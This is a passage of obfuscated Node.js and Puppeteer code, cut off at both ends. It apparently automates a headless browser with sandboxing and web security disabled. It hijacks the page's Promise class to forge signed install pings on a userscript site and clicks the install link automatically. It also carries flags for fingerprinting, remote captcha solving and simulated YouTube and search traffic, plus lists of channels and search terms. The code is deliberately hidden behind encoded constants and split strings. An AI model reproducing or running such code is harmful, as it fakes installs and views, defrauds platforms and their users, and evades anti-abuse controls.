* -0x12ff + -0x4166] |= (-0x1baf + -0x230f + -0x1fd7 * -0x2 | L >> -0x1856 + 0x776 + 0x2 * 0x879) << y[-0x19b0 + -0x25f5 + 0x8 * 0x7f5 & N++], P[N >> 0x1b46 + -0x14a2 + -0x6a2] |= (-0x1b0b * 0x1 + -0xe0 * -0x1 + -0x1 * -0x1aab | L >> 0xb4e + -0x218f + -0x164d * -0x1 & 0x13 * -0x52 + -0x195d + -0x2 * -0xfd9) << y[0x13 * -0x29 + -0xa * -0x1e1 + -0x1 * 0xfbc & N++], P[N >> 0x147e + -0x20be + -0x621 * -0x2] |= (-0x238d + -0x3 * -0xb2a + -0x1 * -0x28f | L >> -0x257e + 0xec9 + 0x16bb & -0x695 * -0x3 + 0x2312 + -0x3692) << y[-0x203f + 0xb * -0xd1 + 0x99 * 0x45 & N++], P[N >> -0xb3c + -0x517 * -0x1 + 0x627] |= (0x1cd * 0x13 + 0x1f17 + -0x2a * 0x18b | -0xe6d * -0x2 + 0x171 * 0x7 + -0x26b2 & L) << y[0x24e3 + 0x2576 + 0x37 * -0x15a & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0x883 + -0x1a39 + -0x2 * -0x117e ? (this['block'] = P[0x1129 + -0x15b4 + -0x189 * -0x3], this['start'] = N - (0x1 * -0x13b3 + 0x1547 + 0x1 * -0x154), this['hash'](), this['hashed'] = -0x1c2b + -0x1 * 0x1517 + -0x1 * -0x3143) : this['start'] = N;
                }
                return this['bytes'] > 0xe301486b + -0x45fdf8e * -0x20 + -0x6efd3a2c && (this['hBytes'] += this['bytes'] / (-0x1c6b26498 + 0x1ca * -0x334216 + -0x322669ff4 * -0x1) << 0x591 + 0x363 + -0x8f4, this['bytes'] = this['bytes'] % (0xb7bbfc1c + 0x6 * -0x142e615e + 0xc15a4c18)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = 0x613 + 0x11b * -0x2 + -0x3dc;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[0x1 * -0xd28 + -0x764 * -0x1 + 0x4 * 0x175] = this['block'], J[K >> -0x7b1 * 0x5 + -0x23b1 + 0x4a28] |= x[-0x1 * 0xf5b + 0x153f + 0x5 * -0x12d & K], this['block'] = J[-0x25c9 * 0x1 + -0x57 * 0x3 + 0x26de], K >= 0x23dc + 0x9de + -0x2 * 0x16c1 && (this['hashed'] || this['hash'](), J[0x892 * 0x4 + -0x1 * 0x1779 + -0xacf] = this['block'], J[-0x1 * 0xaca + 0x3e0 + 0x6fa] = J[-0x112 * -0x12 + -0x6f * -0x13 + -0x1b80] = J[-0x2662 + -0x19cd + 0x4031 * 0x1] = J[0x230b + 0x1170 + -0x2e * 0x124] = J[-0x1ff0 + 0x2b * 0x89 + -0x3 * -0x2fb] = J[-0xd89 + -0xea * 0x8 + 0x14de] = J[-0x2a9 * 0xc + 0x150 + 0x1ea2] = J[0x1faa + 0x6 * 0x2a7 + -0x2f8d] = J[0x1b9 * -0x1 + -0xf0f + -0x8 * -0x21a] = J[0x1 * -0x2111 + 0x1 * 0x18fd + 0x81d] = J[-0x184a * -0x1 + 0x2638 + -0x3e78] = J[0x13 * -0x1df + 0xf1a + 0x147e] = J[-0x1882 * 0x1 + 0x1bc6 + -0x338] = J[0x346 * -0x6 + 0x1f08 + -0xb57] = J[0x9a6 + -0x220d + -0x3 * -0x827] = J[-0x1 * -0x25e8 + 0x947 + -0x2f20] = 0x187e + -0x247e + -0x300 * -0x4), J[0x648 * -0x4 + -0xc * 0x4f + 0x1ce2] = this['hBytes'] << -0x2 * 0xf4f + -0x1d9b + 0x3 * 0x1414 | this['bytes'] >>> 0x2d6 + 0x9a6 + -0xc5f, J[0x1 * -0x1de1 + -0x24b5 + 0x42a5] = this['bytes'] << -0x151 * -0x15 + 0x1 * 0x40f + -0x1fb1, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = -0x386 + 0x1216 + -0x1d0 * 0x8; J < 0x1b07 + -0x268a + -0x3f1 * -0x3; ++J)
                K = Q[J - (0x19d3 + -0x182 * 0xb + -0x1 * 0x93a)] ^ Q[J - (0x2025 + 0x1930 + -0x1 * 0x394d)] ^ Q[J - (-0xcf + 0x2514 + -0x1 * 0x2437)] ^ Q[J - (-0x24b2 + 0xdc8 + -0xad * -0x22)], Q[J] = K << -0x1 * 0x14de + -0x9 * 0x1ea + 0x2619 | K >>> 0xa3c + -0x1 * 0x31f + -0x37f * 0x2;
              for (J = 0x58a + -0x1ebe * -0x1 + -0x2448; J < -0xb08 + 0x18a4 + 0x1 * -0xd88; J += 0x3d8 + -0x1 * -0x13fc + 0x73 * -0x35)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x536 + 0x15 * -0xfb + 0x1b * 0x92 | L >>> -0x1512 + -0x87a + 0x1 * 0x1da7) + (M & N | ~M & O) + P + (-0xb1afe7e3 + -0x3fd7d564 + 0x14c0a36e0) + Q[J] << -0x379 + 0x49 + 0x330) << -0x1605 + -0x377 + 0x1 * 0x1981 | P >>> 0xf96 + -0x4b1 + -0xaca * 0x1) + (L & (M = M << -0x371 * -0x3 + -0x2 * -0x50e + 0x7 * -0x2e7 | M >>> 0x15ce + 0x21e0 + 0xe * -0x3fa) | ~L & N) + O + (-0x7600f8 * -0x23 + -0x93892eb + 0x5398ea9c) + Q[J + (0x824 + -0x94d * -0x2 + -0x5 * 0x559)] << 0xac0 + 0x871 * 0x1 + -0x11 * 0x121) << 0x10fc + -0x7eb + -0x90c * 0x1 | O >>> -0x1 * -0x2482 + -0x20ff * 0x1 + -0x368 * 0x1) + (P & (L = L << 0x9d7 + 0x445 + -0x12 * 0xc7 | L >>> -0x1fa2 + 0x1 * -0x1b8a + 0x3b2e) | ~P & M) + N + (0x2648a * 0x2e57 + -0x621eaa82 + -0x13 * -0x4179697) + Q[J + (-0x1 * -0xc1f + -0x6 * 0x225 + 0x1 * 0xc1)] << 0x887 * 0x1 + 0x19a + 0xa21 * -0x1) << -0x24fa + -0x20e5 + 0x45e4 | N >>> -0x24cd + 0x1190 + 0x1358) + (O & (P = P << 0x771 * 0x5 + 0x1f * -0xdf + -0xa16 | P >>> -0x129 * -0x3 + 0x1586 * -0x1 + 0x120d * 0x1) | ~O & L) + M + (0x2e0fd6e8 + -0x842 * -0x11e46b + -0x2068a87 * 0x33) + Q[J + (0x6a * -0x13 + -0x21a + 0x9fb)] << 0x20d7 + 0x36c * -0x3 + 0x1 * -0x1693) << -0x7e * 0x29 + -0x98f * 0x1 + 0x125 * 0x1a | M >>> -0x8a * 0xa + 0x26d7 + -0x4 * 0x856) + (N & (O = O << -0x63d * -0x6 + -0x1 * -0x8dd + -0x2e2d | O >>> -0x38e + -0x841 + 0xbd1 * 0x1) | ~N & P) + L + (0x95a9 * -0x7672 + -0x1131b * -0xcdb + 0x91f068c2) + Q[J + (0x1 * 0x1277 + 0x41f * 0x8 + 0x336b * -0x1)] << 0x28 * -0xcb + 0x1603 + 0x9b5, N = N << -0x14be + 0x6 * -0xb6 + 0x1920 | N >>> -0x2677 + 0x2416 + 0x263;
              for (; J < 0x3d * 0x94 + -0x56 * 0x4e + 0x8e8 * -0x1; J += 0x1 * -0x13f3 + -0x1459 + 0x2851)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1 * -0x1958 + 0x9 * -0x185 + 0x7 * -0x1aa | L >>> 0x2035 + 0x15d2 + 0x7 * -0x7b4) + (M ^ N ^ O) + P + (0x91ba572b + 0x1696d686 + -0x39774210) + Q[J] << 0xea2 + -0x2068 + 0x11c6) << -0x5 * -0x147 + 0x1e7 + -0x845 | P >>> 0x21f5 + 0x16 * 0x55 + 0x3 * -0xdb8) + (L ^ (M = M << 0x1cef + 0x30 * 0x26 + -0x23f1 | M >>> 0x186d + 0xb12 + 0x5 * -0x719) ^ N) + O + (0x190ed0c + 0x373 * -0x1e3b0a + -0xd58ea213 * -0x1) + Q[J + (0x1 * 0x131e + 0x25fd + -0x391a)] << -0x5e2 * 0x4 + -0x14aa + 0x2c32) << 0x13a * 0xa + 0x141d + -0x26 * 0xda | O >>> -0x30 * -0x27 + -0x1ef + -0x6 * 0xe1) + (P ^ (L = L << -0x1a4c + -0x4d * -0xe + 0x1634 | L >>> -0x225 + -0xf05 + 0x112c) ^ M) + N + (0x130d555 * -0x8b + 0x3b63aaed * -0x3 + 0x1c688c18f) + Q[J + (0x215f + 0xb * -0x1ac + -0xef9)] << -0x2429 + -0x47 * 0x9 + -0x9aa * -0x4) << -0x47c + -0x92e + 0xdaf | N >>> 0x419 * 0x5 + 0x2 * 0x623 + -0x20a8) + (O ^ (P = P << 0xa18 + -0x1f3d + 0x1543 | P >>> -0xd * -0x1ab + -0x43 * -0x49 + -0x122 * 0x24) ^ L) + M + (-0x1 * 0xdc7a4291 + -0x5d7c9fd * 0x2 + 0x15703c22c) + Q[J + (0x1171 + 0x9 * 0x7f + 0x461 * -0x5)] << 0x1 * -0x1cd + 0x530 * 0x3 + 0xdc3 * -0x1) << 0x5a2 * -0x1 + 0x7a2 * -0x1 + 0x1 * 0xd49 | M >>> 0x1e37 + 0x35 * 0x89 + -0x3a79) + (N ^ (O = O << -0x2077 * 0x1 + -0xe1 + 0x10bb * 0x2 | O >>> 0xb7f + -0x411 + -0x76c) ^ P) + L + (0x5f3d6b5a + -0x3eaddaa0 + 0x41edc5d * 0x13) + Q[J + (-0x1 * 0x1640 + -0x2647 + 0x1 * 0x3c8b)] << 0x1b05 * -0x1 + 0x97 * 0x18 + 0x59 * 0x25, N = N << 0x2db + 0x51 + -0x30e | N >>> -0x2376 + 0x8f7 + 0x1a81;
              for (; J < -0x33 * 0x67 + 0xced + -0x7d4 * -0x1; J += 0xd6 + -0x1e7e + 0x1dad)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x2 * 0x8aa + 0x1b75 + -0x2cc4 | L >>> -0x1e6 + -0x2 * 0x137b + 0x28f7) + (M & N | M & O | N & O) + P - (-0x443de8c7 + -0x716bf0be + 0x1268e1ca9 * 0x1) + Q[J] << 0x115d + -0x14b0 + 0x353) << 0x2 * -0x8cc + -0x2f9 * 0x1 + -0x22 * -0x9b | P >>> -0x2 * 0x1078 + 0x1eb3 + 0x258) + (L & (M = M << 0x4 * -0x6b + 0x1ee + 0x4 * -0x9 | M >>> 0x2326 + -0x20e * 0x1 + -0x2116) | L & N | M & N) + O - (-0xc674d96d + 0x32caaa00 + 0x1 * 0x1048e7291) + Q[J + (-0x1bdf * 0x1 + 0x2ff * -0x9 + -0x8b * -0x65)] << 0x18ab + 0x1 * -0x1057 + -0x34 * 0x29) << 0x20bf * -0x1 + -0x43 * 0x86 + -0x13 * -0x392 | O >>> 0x886 + -0x8 * 0x295 + 0xc3d) + (P & (L = L << 0x812 + -0x633 + 0x1c1 * -0x1 | L >>> 0x831 + 0x14fc + -0x1d2b) | P & M | L & M) + N - (-0x65c95bea + 0x599 * 0x14c25 + -0x1f * -0x6b0d9ef) + Q[J + (-0x8e * 0x14 + 0x5ed * -0x4 + 0x6f6 * 0x5)] << -0x2b * -0x2b + -0x1fc8 + 0x188f) << 0x105e + -0x226d + 0xd * 0x164 | N >>> -0x11a0 + -0x1 * 0x16e5 + 0x28a0) + (O & (P = P << 0x1386 + -0x577 + -0x2b * 0x53 | P >>> -0x13 * 0x40 + 0x1e13 + -0x1951) | O & L | P & L) + M - (0x9 * -0x2da723 + 0x461fd122 + 0x2c5f523d) + Q[J + (0x43d * 0x5 + 0x1537 + 0x2a65 * -0x1)] << 0x22c9 + 0x1b8e + -0x3e57) << -0xa05 + 0x9b + 0x96f | M >>> 0x5 * 0x277 + 0x1406 + -0x2 * 0x101f) + (N & (O = O << -0x793 + 0x3ee + 0x3c3 | O >>> -0xd5 * -0x26 + -0x4bd * -0x3 + -0x2dd3) | N & P | O & P) + L - (-0xd * 0x79289b1 + -0x68a9efa * 0x5 + -0x3fef * -0x3d12d) + Q[J + (-0x11b * -0x3 + 0x2d1 * -0x1 + -0x7c)] << 0x6b * -0x4 + -0x1a6 * 0x1 + 0x352, N = N << 0xd19 + 0x3fd + -0x10f8 | N >>> -0xb7 * 0x17 + -0x2640 + 0x36b3;
              for (; J < -0x1777 + -0x4 * -0x404 + 0x7b7; J += -0x216c + -0x1de7 + 0x3f58)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1be0 + 0xd84 + 0xe61 | L >>> -0x370 + 0x3 * 0xacf + -0x1ce2) + (M ^ N ^ O) + P - (-0x3bca2b30 + 0x3717d86 + 0x929d3a7 * 0xc) + Q[J] << -0x49 + 0x13 * -0xb6 + 0xdcb) << -0x24cb + -0x135a * 0x1 + -0x806 * -0x7 | P >>> -0x1e * 0xae + 0x13 * -0x1f3 + -0xe62 * -0x4) + (L ^ (M = M << -0x2248 + -0x155 * -0xd + -0x1 * -0x1115 | M >>> -0x1bdd * -0x1 + 0x1 * 0x1295 + -0x2e70) ^ N) + O - (0x63dd47aa + 0x417206ca + 0x86 * -0xd56377) + Q[J + (0xce4 + -0x1e00 + -0x151 * -0xd)] << 0x713 + -0x1 * 0x64a + -0xc9) << 0x1 * 0x166b + -0x31f + -0x1347 | O >>> 0x804 + 0x1f03 + 0x1 * -0x26ec) + (P ^ (L = L << 0x1090 + -0x14af + 0x43d | L >>> -0x1bc6 + -0x1b77 + -0x1 * -0x373f) ^ M) + N - (0x3 * -0x6bcfb01 + 0x38282eae + 0x11ac007f) + Q[J + (-0x2f * 0xd3 + -0xcc8 + 0x1 * 0x3387)] << 0x1c1a + 0xb3 * 0xd + -0x1 * 0x2531) << -0xd69 + 0x211 + 0x1 * 0xb5d | N >>> 0x1dbb + -0x2f2 + 0xa * -0x2ab) + (O ^ (P = P << 0x1774 + 0xd * 0x19f + -0x2c69 * 0x1 | P >>> -0x19a7 + -0x9 * -0x156 + 0xda3 * 0x1) ^ L) + M - (-0xab44e8 * 0x6c + 0x4a727fce + 0x336bd03c) + Q[J + (-0x1c69 * 0x1 + -0x43 * -0x7f + -0x4d1)] << 0x1100 + 0x61d * 0x2 + 0x1d3a * -0x1) << 0x2076 + -0x2591 + 0x520 | M >>> -0x1 * 0x101a + 0x179b * 0x1 + -0x766 * 0x1) + (N ^ (O = O << -0x12e4 + 0x29 * 0x11 + -0xb * -0x17b | O >>> 0x1 * 0x21c1 + 0x28a * -0xb + -0x5d1) ^ P) + L - (-0x5a9a * -0x2d6f + -0x4945a0a4 + 0x3c9cba * 0x1d4) + Q[J + (-0xab * 0x2f + -0x9 * 0x245 + 0x52f * 0xa)] << 0x2f * 0x35 + -0x1816 + 0xaf * 0x15, N = N << -0x1014 + -0x191 * -0x1 + 0xea1 | N >>> -0x7a * 0x47 + -0xd78 + -0x2f5 * -0x10;
              this['h0'] = this['h0'] + L << -0x1 * -0x1f44 + -0xbac + 0x6 * -0x344, this['h1'] = this['h1'] + M << -0xae * 0x13 + 0x2 * 0xff4 + 0x22 * -0x8f, this['h2'] = this['h2'] + N << 0xfbd + -0x1097 + -0x6d * -0x2, this['h3'] = this['h3'] + O << -0x229d * -0x1 + -0x1 * 0x39b + -0x93 * 0x36, this['h4'] = this['h4'] + P << -0x21fc * -0x1 + -0x2578 + 0x37c;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0x2666 + -0x1885 + 0x3f07 & -0x2429 + -0x647 + -0x2b * -0xfd] + w[J >> -0x1 * 0xa3d + 0x65a * -0x1 + 0x10af & 0x19 * -0x52 + 0x1871 * 0x1 + 0x10 * -0x106] + w[J >> 0x1d9e + 0x740 + -0x24ca & -0x5d0 + -0x18fa + 0x1ed9] + w[J >> -0x228 * 0xc + -0x1 * -0x81 + 0x196f & 0x1fed + -0x59 * -0x5b + -0x3f81] + w[J >> 0x1 * -0x16d9 + 0x1 * 0x10fa + 0x5 * 0x12f & 0x2697 + -0x1d4d + -0x93b] + w[J >> 0x53 * -0x1d + 0xf * -0x1df + -0x8 * -0x4b0 & 0x964 * 0x2 + -0xed + -0x2 * 0x8e6] + w[J >> -0x1ab + 0x78e + -0x5df & -0x25ef + 0x1 * -0x1cdd + 0x42db] + w[0xbac * -0x1 + -0x3f1 * 0x2 + -0x139d * -0x1 & J] + w[K >> 0xc1a + 0x1305 * -0x1 + 0x707 & 0x12aa * -0x1 + -0x26ba + 0x3973] + w[K >> 0xc7 * 0x2f + 0x2178 + -0x45e9 & 0x5 * -0x6d + -0x1ca6 + -0xf6b * -0x2] + w[K >> -0x80 * -0x1d + -0x2197 + 0x132b * 0x1 & -0xd99 * 0x2 + -0x711 + 0x1 * 0x2252] + w[K >> -0x1373 + -0x1 * 0x22e5 + 0x3668 & -0xbf9 + -0x167 * 0x12 + 0x2546 * 0x1] + w[K >> -0x1f5 * 0xb + 0x1386 + 0x20d & -0xc61 * -0x1 + 0x38 * -0x65 + 0x9c6] + w[K >> -0x5a5 + -0x302 * -0x6 + 0xc5f * -0x1 & -0x2 * 0x2e7 + -0x1916 + -0x39 * -0x8b] + w[K >> -0x248 + 0x24b + 0x1 * 0x1 & -0x1d01 + -0x1255 + 0x2f65] + w[0x5 * 0xc7 + -0x1c60 + 0xc46 * 0x2 & K] + w[L >> 0xade + 0x9 * -0x273 + 0x6b * 0x1b & -0x1516 + -0xdf2 * -0x2 + -0x6bf] + w[L >> 0x1475 + 0x640 + -0x1a9d & 0x2654 + 0xd47 + -0x338c] + w[L >> -0x5 * 0x21d + -0x1dd * -0xf + -0x114e & -0x1025 + 0x1607 + -0x1f1 * 0x3] + w[L >> 0x6d * -0x19 + 0x1bc7 + 0x889 * -0x2 & 0x18dc + 0x2478 + 0x5 * -0xc41] + w[L >> 0xc0c + 0x1 * -0xde5 + 0x1e5 & 0x3 * 0x486 + 0x20c1 + -0x2e44] + w[L >> 0x6d * -0x1 + -0xb28 + 0x3df * 0x3 & -0x1 * 0x2357 + 0x118e + 0x11d8] + w[L >> 0x72 * -0x35 + -0x1bdd + -0x23d * -0x17 & -0x568 * 0x2 + -0xb1c + 0x15fb] + w[0x371 + 0x1a35 + -0x9dd * 0x3 & L] + w[M >> 0x2 * -0x3f1 + 0x1354 * 0x1 + -0x1 * 0xb56 & 0x102d + 0x1101 + 0x3d * -0x8b] + w[M >> 0x1 * 0x14d5 + 0x7d0 + 0x1c8d * -0x1 & 0xddb * 0x2 + -0x1 * -0xd46 + 0x28ed * -0x1] + w[M >> 0xfda + -0x18be + 0x8f8 & -0x446 + 0x338 + 0x13 * 0xf] + w[M >> 0x4f * -0x36 + 0x2207 + -0x114d * 0x1 & 0xa5 * 0x20 + 0x109 * 0x2 + -0x16a3] + w[M >> 0x3a1 * 0x1 + 0x2 * 0xfdf + 0x2353 * -0x1 & 0x17 * 0x89 + -0x1 * 0x1191 + 0x551] + w[M >> -0x1250 + -0x11 * 0xa5 + 0x1d4d & -0x1d3b * 0x1 + 0x4 * 0x841 + 0x3 * -0x13e] + w[M >> 0x6 * -0x49 + 0x1560 + -0x13a6 & -0x108 * 0xf + 0x1307 + -0x4 * 0xe0] + w[0x7 * -0x401 + 0x1 * -0x8c2 + 0x12 * 0x20c & M] + w[N >> 0x14eb + 0x186f + -0x2d3e * 0x1 & 0xa97 * -0x1 + -0x3 * -0x595 + -0x619] + w[N >> 0xc7a * -0x1 + -0x709 * 0x1 + 0x3 * 0x689 & 0x2 * -0x221 + 0x1bdb + -0x178a] + w[N >> 0x167 * 0x17 + -0xb49 + -0x14e4 & -0xd81 + 0x2b * 0x25 + 0x759] + w[N >> 0x1 * -0x1fcf + 0xc76 + -0x1 * -0x1369 & -0x216 + 0x21c7 + -0x1fa2] + w[N >> 0x3a5 * -0x2 + -0x2d + 0x783 & 0x13b1 + -0x3 * -0x6d9 + -0x282d] + w[N >> -0x32e + 0x26ab + 0x139 * -0x1d & -0x4 * -0x2a7 + 0xce1 * -0x1 + 0x254] + w[N >> 0xb2 + 0x1d97 + -0x1e45 & -0x1de * 0x11 + 0x10f * -0x7 + 0x2736] + w[-0x3b7 + 0x5f8 * 0x2 + -0x82a & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x1cd3 + 0x1849 * -0x1 + -0x472 & 0x858 * -0x2 + -0x265e + 0x380d,
                J >> -0x829 * 0x2 + 0x1 * 0x17ba + -0x758 & 0x1128 + -0x4a1 + 0x148 * -0x9,
                J >> -0x1 * -0x2683 + 0xbb9 * 0x2 + -0x3ded & -0x2142 + 0x7e2 * 0x3 + 0x21f * 0x5,
                0xb * 0xbe + -0xda8 * -0x2 + -0x227b & J,
                K >> 0x5f0 + -0x309 * -0x8 + 0x4 * -0x788 & -0x70e + 0x12 * 0x62 + 0x129,
                K >> -0x6 * 0x2 + -0x10c4 * -0x1 + -0xd * 0x148 & 0x524 + 0x744 + -0xb69,
                K >> -0x982 + -0x789 + -0x1f * -0x8d & 0x3 * -0x146 + 0x3 * -0x9c7 + -0x8d * -0x3e,
                -0x17da + 0x21c9 * 0x1 + -0x8f0 * 0x1 & K,
                L >> -0x1b53 + -0x8e * -0x43 + -0x9bf & -0x97 * -0x15 + 0x16e5 + -0x2249,
                L >> -0x1096 + -0x2187 * 0x1 + -0xa09 * -0x5 & 0x178f + -0x85b + -0xe35,
                L >> 0x1 * 0x761 + 0xc * 0x2cf + -0x290d & 0x77 * 0x29 + -0x2 * -0xd31 + 0x2 * -0x1639,
                -0x2 * 0xa45 + -0x1950 + 0x2ed9 & L,
                M >> -0x2462 + -0x1 * -0x1bc9 + -0x59 * -0x19 & 0x7e3 * 0x3 + 0x781 + -0x1e2b * 0x1,
                M >> 0x9d * -0x39 + 0x6 * 0x2d8 + 0x1 * 0x11f5 & -0xfef + -0x2bb * 0x5 + 0x1e95 * 0x1,
                M >> 0x366 + 0x23d9 + -0x2737 & 0x1d * -0x49 + -0x1a86 + 0x23ca,
                -0x1f85 + -0x6a3 * 0x1 + 0x2727 & M,
                N >> 0x232e * 0x1 + -0x7 * 0x44 + -0x213a & 0x7b3 + -0x6 * 0x66b + 0x1fce,
                N >> -0x1e1f * 0x1 + -0x1 * 0x1093 + 0x2ec2 & 0xca8 + -0x12d0 * -0x1 + -0x1e79,
                N >> -0x3bf + -0x5e8 * -0x3 + -0xdf1 & 0x1318 + -0x5 * 0x2d4 + -0x3f5,
                -0x15c1 + -0x2 * -0x11d7 + -0xcee & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x4 * 0x139 + 0x202a + -0x1 * 0x24fa), (K = new DataView(J))['setUint32'](-0x24ed + -0x1 * 0x16b7 + 0x3ba4, this['h0']), K['setUint32'](0x820 + -0x1d6d + 0x1551, this['h1']), K['setUint32'](-0x1a85 + -0x1 * 0x1195 + -0x1611 * -0x2, this['h2']), K['setUint32'](0x1 * 0xfc3 + -0x1e40 + 0xe89, this['h3']), K['setUint32'](-0x4 * 0x2a1 + -0x1689 * 0x1 + -0x211d * -0x1, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x1a7d + -0x20e8 + 0x66b];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x11 * 0x22 + 0xb7 * -0x17 + 0x1 * 0x12b3;
            J[0x1169 + 0x16f5 + -0x285e * 0x1]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0x269 * 0x6 + 0xca4 + -0x2 * -0xe9] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x69 * 0xe + 0x1de2 + 0xb * -0x33d), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0xaa * -0x3 + 0x6 * -0x3d1 + 0x14e9;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0xfd + -0x34 + 0x513 * 0x1), Promise['resolve'](0x2395 + -0xadc + -0x4 * 0x62e);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0x2354 + -0x2 * -0x15b + -0x260a; j < -0x1 * -0xa59 + -0xbc * 0x20 + 0xd28; j++)
    i();
}
const NETWORK_PATIENCE = -0x25a6 + 0xc11 * 0x1 + -0x38d5 * -0x1 + (0x1f9d * -0x1 + 0xf19 + 0x1a * 0x116) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0x4e6 + -0x25ad + -0x6 * -0x719) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0x376 + 0xb41 + 0x5f * -0x15; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + 